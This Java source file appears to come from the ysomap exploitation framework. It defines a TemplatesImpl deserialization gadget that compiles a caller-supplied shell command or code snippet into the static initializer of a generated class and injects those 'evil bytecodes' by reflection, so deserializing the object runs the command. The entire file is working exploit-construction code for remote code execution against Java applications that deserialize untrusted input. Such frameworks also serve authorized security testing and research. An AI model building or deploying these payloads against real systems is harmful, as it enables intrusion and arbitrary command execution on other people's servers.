package ysomap.gadget.bullet;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import ysomap.gadget.ObjectGadget;
import ysomap.util.ClassFiles;
import ysomap.util.PayloadHelper;
import ysomap.util.Reflections;

import java.io.Serializable;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
public class TemplatesImplBullet implements ObjectGadget<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;
    private String body;

    public TemplatesImplBullet(String[] args) {
        args = args == null? PayloadHelper.defaultTestCommand() : args;
        if(args.length == 2){// code mode
            this.body = args[1];
        }else if(args.length == 1){// system command execute mode
            this.body = "java.lang.Runtime.getRuntime().exec(\"" +
                    args[0].replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                    "\");";
        }
        try {
            initClazz();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObject() throws Exception {
        // create evil bytecodes
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = ClassFiles.makeClassFromExistClass(pool,
                            StubTransletPayload.class,
                            new Class<?>[]{abstractTranslet}
                );
        ClassFiles.insertStaticBlock(cc, body);
        ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        byte[] bytecodes = cc.toBytecode();
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }


    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        }else{
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }
}
